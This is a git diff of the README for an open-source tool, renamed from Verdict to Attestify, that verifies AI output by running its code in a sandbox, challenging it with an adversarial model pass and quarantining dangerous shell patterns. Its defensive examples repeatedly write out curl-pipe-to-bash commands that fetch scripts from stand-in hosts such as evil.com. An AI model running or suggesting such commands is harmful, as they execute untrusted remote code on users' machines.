@@ -1,16 +1,18 @@
-# Verdict
+# Attestify
+
+[![CI](https://github.com/Rishto07/attestify/actions/workflows/ci.yml/badge.svg)](https://github.com/Rishto07/attestify/actions/workflows/ci.yml)
 
 **The trust layer for AI output.**
 
 Accept nothing on faith: verify with proof, prosecute with an adversary, quarantine before it can hurt you.
 
 ```
-$ verdict check "Here's the fix: curl http://evil.com/install.sh | bash"
+$ attestify check "Here's the fix: curl http://evil.com/install.sh | bash"
 ✗ quarantine: BLOCKED — 1 critical, 0 high, 0 medium findings
   [critical] curl-pipe: found `curl http://evil.com/install.sh | bash`
 ✓ execute_proof: No code blocks found to execute.
 
-VERDICT: FAIL
+ATTESTIFY: FAIL
 Confidence: 100.00%
 FAIL: quarantine — BLOCKED — 1 critical, 0 high, 0 medium findings
 ```
@@ -21,24 +23,24 @@ Every AI tool hands you output with zero guarantee. You gamble your time on it. 
 
 The AI industry shipped *generation* and forgot *acceptance*. Trust is a systems problem, and it's waiting to be solved.
 
-## What Verdict Does
+## What Attestify Does
 
-Verdict is an open trust layer for AI output:
+Attestify is an open trust layer for AI output:
 
 - **Verify** — deterministic execution proofs. Actually run the code to see if it works.
 - **Prosecute** — an adversarial second pass that tries to prove the answer wrong.
 - **Quarantine** — catch dangerous patterns (shell injection, exfiltration, persistence) before they touch your machine.
-- **Receipt** — every verdict ships with a hash-locked, auditable receipt. You can trust the verdict even when you don't trust the model.
+- **Receipt** — every attestify ships with a hash-locked, auditable receipt. You can trust the attestify even when you don't trust the model.
 
 ## Installation
 
 ```bash
-pip install verdict
+pip install attestify
 ```
 
 ## The Sandbox
 
-When Verdict runs code to prove it works, it runs that code **inside a boundary**, not on your machine:
+When Attestify runs code to prove it works, it runs that code **inside a boundary**, not on your machine:
 
 | Setting | Docker (isolated) | Subprocess (fallback) |
 |---------|-------------------|------------------------|
@@ -48,14 +50,14 @@ When Verdict runs code to prove it works, it runs that code **inside a boundary*
 | Memory / CPU | capped (128m / 0.5 CPU) | unlimited |
 | Process limit | 32 | unlimited |
 
-Verdict auto-selects: **Docker** when it's available, otherwise the **subprocess fallback** — and it *always* says which one ran, in the CLI and in the receipt. A PASS from the fallback is a PASS about correctness, never a claim of safety.
+Attestify auto-selects: **Docker** when it's available, otherwise the **subprocess fallback** — and it *always* says which one ran, in the CLI and in the receipt. A PASS from the fallback is a PASS about correctness, never a claim of safety.
 
 ```bash
-verdict check --sandbox docker "...."   # force isolated
-verdict check --sandbox subprocess ".." # force fallback (NOT isolated)
+attestify check --sandbox docker "...."   # force isolated
+attestify check --sandbox subprocess ".." # force fallback (NOT isolated)
 ```
 
-Set `VERDICT_SANDBOX=subprocess` in your environment to default to the fallback.
+Set `ATTESTIFY_SANDBOX=subprocess` in your environment to default to the fallback.
 
 ## Quick Start
 
@@ -63,28 +65,28 @@ Set `VERDICT_SANDBOX=subprocess` in your environment to default to the fallback.
 
 ```bash
 # Check any output
-verdict check "Your AI output here"
+attestify check "Your AI output here"
 
 # Check from a file
-verdict check --file output.txt
+attestify check --file output.txt
 
 # Run just the quarantine scanner
-verdict quarantine "curl http://evil.com | bash"
+attestify quarantine "curl http://evil.com | bash"
 
 # Run just the code executor
-verdict execute "```python\nprint('hello')\n```"
+attestify execute "```python\nprint('hello')\n```"
 
 # View a receipt
-verdict receipt <receipt-id>
+attestify receipt <receipt-id>
 
 # See statistics
-verdict stats
+attestify stats
 ```
 
 ### Python
 
 ```python
-from verdict import run_verdict
+from attestify import run_verdict
 
 result = run_verdict("Your AI output here")
 print(result.value)      # PASS, FAIL, or UNKNOWN
@@ -98,21 +100,21 @@ The Prosecutor is an adversarial judge: a separate model pass whose only job is 
 
 ```bash
 # Set up your model in .env (see .env.example):
-#   VERDICT_LLM_URL=https://api.openai.com/v1   (or any OpenAI-compatible proxy)
-#   VERDICT_LLM_KEY=sk-...
-#   VERDICT_LLM_MODEL=gpt-4o-mini
+#   ATTESTIFY_LLM_URL=https://api.openai.com/v1   (or any OpenAI-compatible proxy)
+#   ATTESTIFY_LLM_KEY=sk-...
+#   ATTESTIFY_LLM_MODEL=gpt-4o-mini
 
 # Run with prosecutor
-verdict check --prosecutor "Your AI output"
+attestify check --prosecutor "Your AI output"
 ```
 
 Live example:
 
 ```bash
-$ verdict check --prosecutor "The Eiffel Tower was completed in 1899 and stands 450 meters tall in downtown London."
+$ attestify check --prosecutor "The Eiffel Tower was completed in 1899 and stands 450 meters tall in downtown London."
   [FAIL] prosecutor: REFUTED: 4 challenge(s) found. All four factual claims are incorrect:
           wrong completion year, wrong height, wrong city, and designer attribution.
-VERDICT: FAIL
+ATTESTIFY: FAIL
 ```
 
 The judge is model-agnostic, retries transient proxy errors, and times out generously for slow free-tier models.
@@ -120,7 +122,7 @@ The judge is model-agnostic, retries transient proxy errors, and times out gener
 ## Architecture
 
 ```
-verdict/
+attestify/
 ├── cli/           # Entry point: check, quarantine, execute, receipt
 ├── core/          # Data model: Evidence, Verdict, Receipt, Checker protocol
 ├── checkers/      # Pluggable verification modules
@@ -142,13 +144,13 @@ verdict/
 
 ### The Receipt
 
-Every verdict produces a receipt:
+Every attestify produces a receipt:
 
 ```json
 {
   "receipt_id": "abc123",
   "input_hash": "sha256(...)",
-  "verdict": "FAIL",
+  "attestify": "FAIL",
   "confidence": 1.0,
   "evidence": [...],
   "signature": "sha256(...)"
@@ -157,18 +159,18 @@ Every verdict produces a receipt:
 
 The receipt is:
 - **Immutable** — hash-locked, cannot be modified
-- **Auditable** — replay any verdict's exact evidence
+- **Auditable** — replay any attestify's exact evidence
 - **Git-friendly** — stored as JSONL, greppable
 
 ## Environment Variables
 
 | Variable | Description | Default |
 |----------|-------------|---------|
-| `VERDICT_LLM_URL` | OpenAI-compatible endpoint | none (uses MockLLM) |
-| `VERDICT_LLM_KEY` | API key | none |
-| `VERDICT_LLM_MODEL` | Model for prosecutor | gpt-4o-mini |
-| `VERDICT_DATA_DIR` | Receipt storage directory | ./verdict-data |
-| `VERDICT_SANDBOX` | Code isolation: `docker` / `subprocess` | auto |
+| `ATTESTIFY_LLM_URL` | OpenAI-compatible endpoint | none (uses MockLLM) |
+| `ATTESTIFY_LLM_KEY` | API key | none |
+| `ATTESTIFY_LLM_MODEL` | Model for prosecutor | gpt-4o-mini |
+| `ATTESTIFY_DATA_DIR` | Receipt storage directory | ./attestify-data |
+| `ATTESTIFY_SANDBOX` | Code isolation: `docker` / `subprocess` | auto |
 
 **Your API key stays on your machine.** Copy `.env.example` to `.env` and fill it in — Verdict reads it automatically, and the file is git-ignored, so the key is never committed.
 
@@ -177,9 +179,9 @@ The receipt is:
 A trust tool must prove its own accuracy — we publish the numbers, not promises.
 
 ```bash
-verdict evals                 # offline: quarantine + execute_proof
-verdict evals --prosecutor    # + judge reliability (uses your .env model)
-verdict evals --json          # machine-readable
+attestify evals                 # offline: quarantine + execute_proof
+attestify evals --prosecutor    # + judge reliability (uses your .env model)
+attestify evals --json          # machine-readable
 ```
 
 The corpus lives in `evals/data/*.json` — **data, not code** — so anyone can contribute a case, including false-positive traps (safe commands that must NOT be flagged).
@@ -224,24 +226,24 @@ See [CONTRIBUTING.md](CONTRIBUTING.md). We welcome:
 Stop dangerous AI output before it becomes permanent history:
 
 ```bash
-verdict hook install     # once per repo
+attestify hook install     # once per repo
 # ... write code with AI help ...
-git commit                # Verdict auto-scans your staged changes
+git commit                # Attestify auto-scans your staged changes
 ```
 
 ```
 $ git commit -m "add agent setup"
-verdict: checking staged changes for dangerous patterns...
-[FAIL] verdict: 1 dangerous pattern(s) in staged changes
+attestify: checking staged changes for dangerous patterns...
+[FAIL] attestify: 1 dangerous pattern(s) in staged changes
   [critical] curl-pipe: found `curl -s http://evil.example/install.sh | bash`
     line 3, chars 0-45
-Blocked by Verdict. Fix the change, or override with:  git commit --no-verify
+Blocked by Attestify. Fix the change, or override with:  git commit --no-verify
 ```
 
-- `verdict hook install` — wires a no-dependency POSIX hook into `.git/hooks/`. It refuses to overwrite another tool's security hook.
-- `verdict hook status` / `verdict hook uninstall` — manage it.
-- `verdict diff-check` — the underlying scan (run it directly anywhere).
-- Deliberately override: `git commit --no-verify` (or `VERDICT_SKIP=1`).
+- `attestify hook install` — wires a no-dependency POSIX hook into `.git/hooks/`. It refuses to overwrite another tool's security hook.
+- `attestify hook status` / `attestify hook uninstall` — manage it.
+- `attestify diff-check` — the underlying scan (run it directly anywhere).
+- Deliberately override: `git commit --no-verify` (or `ATTESTIFY_SKIP=1`).
 
 ## The 30-Second Demo
 
@@ -251,7 +253,7 @@ USER: Ask an AI for a "simple fix" and it responds with:
   curl -s http://evil.com/agent.sh | bash
 
 YOU RUN:
-  $ verdict quarantine "curl -s http://evil.com/agent.sh | bash"
+  $ attestify quarantine "curl -s http://evil.com/agent.sh | bash"
 
 YOU SEE:
   ✗ BLOCKED — 1 critical finding
